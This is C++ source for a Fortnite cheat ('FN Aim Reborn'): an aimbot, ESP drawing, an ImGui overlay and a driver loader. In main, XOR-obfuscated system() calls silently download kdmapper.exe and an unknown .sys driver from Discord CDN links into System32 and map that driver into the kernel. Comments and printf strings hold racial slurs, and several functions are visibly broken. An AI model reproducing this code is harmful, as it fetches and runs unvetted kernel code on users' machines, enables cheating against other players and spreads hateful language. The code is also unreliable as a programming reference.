#include <iostream>
#include <string>
#include <Windows.h>
#include "FN Utils/includes.h"
#include "Imgui/imgui.h"
#include "FN Utils/settings.h"
#include "FN Utils/structs.h"
#include "Overlay/overlay.hpp"
#include "Window Utils/xor.h"
#include "FN Utils/structs.h"

#define LeProxy 0xDEADBEEF


// CHECK OVERLAY.HPP
// IMGUI_WIDGETS

/* 
FN BASE I MADE
originally had gloomys actor loop, then vantas and then mine i remade. PS Don't use fn entity lloops, they just cause trouble.
Using normal pasted actor loop now i found.
Aimbot prediction isn't updated and esp isn't added
Nothing else really needed, driver working and aimbot method is added.

ERROR - W2S NEEDS TO BE UPDATED

Change log:
Added Z cords to paste for more precise AIM :walter falling gif:
Fixed Actor Lopp

Added my Own PEAUTH Modified Driver, not tested

- FOR BABY DRAKEN
*/

class Color
{
public:
	RGBA red = { 255,0,0,255 };
	RGBA Magenta = { 255,0,255,255 };
	RGBA yellow = { 255,255,0,255 };
	RGBA grayblue = { 128,128,255,255 };
	RGBA green = { 128,224,0,255 };
	RGBA darkgreen = { 0,224,128,255 };
	RGBA brown = { 192,96,0,255 };
	RGBA pink = { 255,168,255,255 };
	RGBA DarkYellow = { 216,216,0,255 };
	RGBA BuffaloPurple = { 94,23,235,255 };
	RGBA SilverWhite = { 236,236,236,255 };
	RGBA purple = { 129, 47, 212,255 };
	RGBA Navy = { 88,48,224,255 };
	RGBA skyblue = { 0,136,255,255 };
	RGBA graygreen = { 128,160,128,255 };
	RGBA blue = { 0,96,192,255 };
	RGBA coolcol = { 51, 171, 145, 255 };
	RGBA orange = { 255,128,0,255 };
	RGBA peachred = { 255,80,128,255 };
	RGBA reds = { 255,128,192,255 };
	RGBA darkgray = { 96,96,96,255 };
	RGBA Navys = { 0,0,128,255 };
	RGBA darkgreens = { 0,128,0,255 };
	RGBA darkblue = { 0,128,128,255 };
	RGBA redbrown = { 128,0,0,255 };
	RGBA purplered = { 128,0,128,255 };
	RGBA greens = { 0,255,0,255 };
	RGBA envy = { 0,255,255,255 };
	RGBA black = { 0,0,0,255 };
	RGBA gray = { 177, 181, 179,255 };
	RGBA white = { 255,255,255,255 };
	RGBA blues = { 30,144,255,255 };
	RGBA lightblue = { 135,206,250,160 };
	RGBA Scarlet = { 220, 20, 60, 160 };
	RGBA white_ = { 255,255,255,200 };
	RGBA gray_ = { 128,128,128,200 };
	RGBA black_ = { 0,0,0,200 };
	RGBA red_ = { 255,0,0,200 };
	RGBA Magenta_ = { 255,0,255,200 };
	RGBA yellow_ = { 255,255,0,200 };
	RGBA grayblue_ = { 128,128,255,200 };
	RGBA green_ = { 128,224,0,200 };
	RGBA darkgreen_ = { 0,224,128,200 };
	RGBA brown_ = { 192,96,0,200 };
	RGBA pink_ = { 255,168,255,200 };
	RGBA darkyellow_ = { 216,216,0,200 };
	RGBA silverwhite_ = { 236,236,236,200 };
	RGBA purple_ = { 144,0,255,200 };
	RGBA Blue_ = { 88,48,224,200 };
	RGBA skyblue_ = { 0,136,255,200 };
	RGBA graygreen_ = { 128,160,128,200 };
	RGBA blue_ = { 0,96,192,200 };
	RGBA orange_ = { 255,128,0,200 };
	RGBA pinks_ = { 255,80,128,200 };
	RGBA Fuhong_ = { 255,128,192,200 };
	RGBA darkgray_ = { 96,96,96,200 };
	RGBA Navy_ = { 0,0,128,200 };
	RGBA darkgreens_ = { 0,128,0,200 };
	RGBA darkblue_ = { 0,128,128,200 };
	RGBA redbrown_ = { 128,0,0,200 };
	RGBA purplered_ = { 128,0,128,200 };
	RGBA greens_ = { 0,255,0,200 };
	RGBA envy_ = { 0,255,255,200 };

	RGBA glassblack = { 0, 0, 0, 160 };
	RGBA GlassBlue = { 65,105,225,80 };
	RGBA glassyellow = { 255,255,0,160 };
	RGBA glass = { 200,200,200,60 };

	RGBA filled = { 0, 0, 0, 150 };

	RGBA Plum = { 221,160,221,160 };

	RGBA rainbow() {

		static float x = 0, y = 0;
		static float r = 0, g = 0, b = 0;

		if (y >= 0.0f && y < 255.0f) {
			r = 255.0f;
			g = 0.0f;
			b = x;
		}
		else if (y >= 255.0f && y < 510.0f) {
			r = 255.0f - x;
			g = 0.0f;
			b = 255.0f;
		}
		else if (y >= 510.0f && y < 765.0f) {
			r = 0.0f;
			g = x;
			b = 255.0f;
		}
		else if (y >= 765.0f && y < 1020.0f) {
			r = 0.0f;
			g = 255.0f;
			b = 255.0f - x;
		}
		else if (y >= 1020.0f && y < 1275.0f) {
			r = x;
			g = 255.0f;
			b = 0.0f;
		}
		else if (y >= 1275.0f && y < 1530.0f) {
			r = 255.0f;
			g = 255.0f - x;
			b = 0.0f;
		}


		return RGBA{ (DWORD)r, (DWORD)g, (DWORD)b, 255 };
	}
};
Color Col;
 
// Makes me sad
typedef struct _FNlEntity {
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;
std::vector<FNlEntity> entityList;

Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	/* Bullet drop correction */
//	float bulletDrop = (gravity / 250) * time * time;
//	recalculated.z += bulletDrop * 120;
	/* Player movement correction */
//	recalculated.x += time * (targetVelocity.x);
//	recalculated.y += time * (targetVelocity.y);
//	recalculated.z += time * (targetVelocity.z);
	return recalculated;
}

void AimbotPrediction(DWORD_PTR mesh, Vector3 headpos) 
{
	float distance = actors::localactorpos.Distance(headpos) / 250;
	uint64_t CurrentActorRootComponent = read<uint64_t>(mesh + OFFSETS::RootComponet);
	Vector3 vellocity = read<Vector3>(CurrentActorRootComponent + OFFSETS::Velocity);
	Vector3 Predicted = AimbotCorrection(30000, -504, distance, headpos, vellocity);
	Vector3 rootHeadOut = Structs::WorldToScreen::W2S(Predicted);
	if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
		if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings_options.AimDistance * 1)) {
			Softaim(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
		}
	}
}

void SetMouseAbsPosition(DWORD x, DWORD y, DWORD z)
{
	DWORD Defined_Target = (x + y + z); // <- Niggerish way to do it
	INPUT input = { 0 };
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE;
	input.mi.dx = Defined_Target;
	input.mi.dy = Defined_Target;
	SendInput(1, &input, sizeof(input));
}

void Softaim(float x, float y, float z) {
	int AimSpeed = Settings_options.smooth;
	float Defined_Target = static_cast<float>(x) + static_cast<float>(y) + static_cast<float>(z) + 1; // <- hitbone offset
	float ScreenCenter = (Width / static_cast<float>(2), Height / static_cast<float>(2), Depth / static_cast<float>(2));
	float Target = 0;

	if (Defined_Target != 0) {
		if (Defined_Target > ScreenCenter) {
			Target = -(ScreenCenter - Defined_Target); Target /= AimSpeed;
			if (Target + ScreenCenter > ScreenCenter * 2) Target = 0;
		}

		if (Defined_Target < ScreenCenter) {
			Target = Defined_Target - ScreenCenter; Target /= AimSpeed;
			if (Target + ScreenCenter < 0) Target = 0;
		}
	}

	SetMouseAbsPosition(static_cast<DWORD>(Target), static_cast<DWORD>(Target), static_cast<DWORD>(Target));
	return;
}

bool isVisible(uint64_t mesh) {
	float tik = read<float>(mesh + 0x330);
	float tok = read<float>(mesh + 0x334);
	const float tick = 0.06f;
	return tok + tick >= tik;
}

void DrawFNCS()
{
	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	DWORD_PTR GameState = read<DWORD_PTR>(actors::Uworld + 0x158);//gamestate
	DWORD_PTR PlayerArray = read<DWORD_PTR>(GameState + OFFSETS::PlayerArray);//playerarray
	actors::Uworld = read<DWORD_PTR>(base_address + 0xB8C7C60);
	DWORD_PTR Gameinstance = read<DWORD_PTR>(actors::Uworld + 0x190);
	DWORD_PTR LocalPlayers = read<DWORD_PTR>(Gameinstance + 0x38);
	actors::Localplayer = read<DWORD_PTR>(LocalPlayers);
	actors::PlayerController = read<DWORD_PTR>(actors::Localplayer + 0x30);
	actors::LocalPawn = read<DWORD_PTR>(actors::PlayerController + 0x2B0);
	actors::PlayerState = read<DWORD_PTR>(actors::LocalPawn + 0x240);
	actors::Rootcomp = read<DWORD_PTR>(actors::LocalPawn + 0x138); //old 130
	actors::relativelocation = read<DWORD_PTR>(actors::Rootcomp + OFFSETS::RelativeLocation);
	actors::Persistentlevel = read<DWORD_PTR>(actors::Uworld + 0x30);
	DWORD ActorCount = read<DWORD>(actors::Persistentlevel + 0xA0);
	DWORD_PTR AActors = read<DWORD_PTR>(actors::Persistentlevel + 0x98);

	for (int i = 0; i < ActorCount; i++) {
		Settings_options.IsVis = isVisible;

		auto player = read<uintptr_t>(PlayerArray + i * 0x8);
		auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int MyTeamId = read<int>(actors::PlayerState + OFFSETS::TeamId);
		DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + OFFSETS::PlayerState);
		int ActorTeamId = read<int>(otherPlayerState + OFFSETS::TeamId);

		Vector3 Headpos = Structs::GetBone::GetBoneWithRotation(CurrentActorMesh, 68);
		Vector3 bone0 = Structs::GetBone::GetBoneWithRotation(CurrentActorMesh, 0);
		Vector3 bottom = Structs::WorldToScreen::W2S(bone0);
		Vector3 DrawListHead = Structs::WorldToScreen::W2S(Vector3(Headpos.x, Headpos.y, Headpos.z));

		Vector3 Headbox = Structs::WorldToScreen::W2S(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * 0.550;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * 0.550;

		RGBA ESPColorSkill = { 255, 255, 0, 255 };
		if (Settings_options.VisableCheck) {
			if (Settings_options.IsVis) {
				ESPColorSkill = { 0, 255, 0, 255 };
			}
			else if (!Settings_options.IsVis) {
				ESPColorSkill = { 255, 0, 0, 255 };
			}
		}

		if (MyTeamId == ActorTeamId) continue;
		if (CurrentActor == actors::LocalPawn) continue;

		if (Settings_options.Esp || actors::LocalPlayers != 0)
		{
			if (Settings_options.corner) {
				printf("Fuck niggers");
			}
		}
	}
}

void Render()
{
	if (Settings_options.Trademark) { ImGui::GetOverlayDrawList()->AddText(ImVec2(13, 110 + 18 * 5), IM_COL32(255, 255, 255, 255), ("FNs Softaim")); }
	if (Settings_options.FOVCircle) { Overlay::cheat::DrawCircle(Width / 2, Height / 2, Settings_options.AimFOV, &Col.filled, 2000, 0.5); }

	DrawFNCS();

	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_ChildWindowBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_Column] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ColumnHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_ColumnActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.150f, 0.361f, 0.696f, 1.000f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
	colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);

	ImGui::GetStyle().WindowPadding = ImVec2(15, 15);
	ImGui::GetStyle().WindowRounding = 5.0f;
	ImGui::GetStyle().FramePadding = ImVec2(5, 5);
	ImGui::GetStyle().FrameRounding = 4.0f;
	ImGui::GetStyle().ItemSpacing = ImVec2(12, 8);
	ImGui::GetStyle().ItemInnerSpacing = ImVec2(8, 6);
	ImGui::GetStyle().IndentSpacing = 25.0f;
	ImGui::GetStyle().ScrollbarSize = 15.0f;
	ImGui::GetStyle().ScrollbarRounding = 9.0f;
	ImGui::GetStyle().GrabMinSize = 5.0f;
	ImGui::GetStyle().GrabRounding = 3.0f;

	if (Settings_options.DrawMenu)
	{
		if (ImGui::Begin(("FN"), 0, ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar))
			ImGui::SetNextWindowSize(ImVec2({ 300, 675 }), ImGuiSetCond_FirstUseEver); {
			ImGui::SetWindowSize({ 520, 400 });
			static int MenuTab;

			if (ImGui::Button("Aimbot", ImVec2(120 - 5, 30))) { MenuTab = 1; }
			ImGui::SameLine();
			if (ImGui::Button("Visuals", ImVec2(120 - 5, 30))) { MenuTab = 2; }
			ImGui::SameLine();
			if (ImGui::Button("Features", ImVec2(120 - 5, 30))) { MenuTab = 3; }

			ImGui::Spacing();

			// Shit menu

			switch (MenuTab) {
			case 0:
				ImGui::Text("Skeeting");
				break;
			}
		}

		ImGui::GetIO().MouseDrawCursor = 1;
	}
	else {
		ImGui::GetIO().MouseDrawCursor = 0;
	}

	ImGui::End();
	ImGui::EndFrame();

	p_Device->SetRenderState(D3DRS_ZENABLE, false);
	p_Device->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	p_Device->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	p_Device->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);
	if (p_Device->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		p_Device->EndScene();
	}
	HRESULT result = p_Device->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && p_Device->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		p_Device->Reset(&p_Params);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

WPARAM MainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, hwnd, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();
		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		if (hwnd_active == GameWnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(hwnd, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}
		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(GameWnd, &rc);
		ClientToScreen(GameWnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = GameWnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(0x1)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;
		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{

			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			p_Params.BackBufferWidth = Width;
			p_Params.BackBufferHeight = Height;
			SetWindowPos(hwnd, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			p_Device->Reset(&p_Params);
		}
		Render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();


	Cleanup();
	DestroyWindow(hwnd);

	return Message.wParam;
}

int main()
{
	SetConsoleTitleA("FN Aim Reborn");
	std::cout << "\n";
	printf("Loading softaim. \n");
	printf("LOADING DRIVER.");
	Sleep(500);
	system("cls");
	printf("LOADING DRIVER..");
	Sleep(500);
	system("cls");
	printf("LOADING DRIVER...");
	Sleep(500);
	system("cls");
	printf("LOADING DRIVER....");
	Sleep(500);
	system("cls");
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\KDMapper.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1047990317732859945/1054129973830627338/drvmoment.sys --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1").c_str());
	system(_xor_("cls").c_str());
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\KDMapper.exe C:\\Windows\\System32\\drvmoment.sys").c_str());
	Sleep(1000);
	printf("DRIVER LOADED \n");
	Sleep(500);
	system("cls");
	printf("LOADING MODULE.");
	Sleep(500);
	system("cls");
	printf("LOADING MODULE..");
	Sleep(500);
	system("cls");
	printf("LOADING MODULE...");
	Sleep(500);
	system("cls");
	printf("LOADING MODULE...");

	driver->Attach(process_id);
	base_address = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe");
	process_id = driver->GetProcessId((L"FortniteClient-Win64-Shipping.exe"));
	// CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(Actors), nullptr, NULL, nullptr);
	Sleep(500);
	printf("MODULE BASE ATTACHED \n");
	Sleep(700);
	printf("PROCCES ID ATTACHED \n");
	Sleep(700);
	printf("LOOP DRAWN \n");
	Sleep(700);
	printf("OVERLAY INITED \n");
	Sleep(700);
	printf("CHEAT : LOADED \n");
	Sleep(700);
	printf(("Modules Base Address :0x%TlY"), base_address);
	printf(("\nModules Proccess ID :0x%XU"), process_id);
	printf("\nFn External : Chapter 4 Season 1 V23.10 Windows 10 64-bit");

	SetWindow();
	DirectXInit(hwnd);
	MainLoop();

	return 0;
}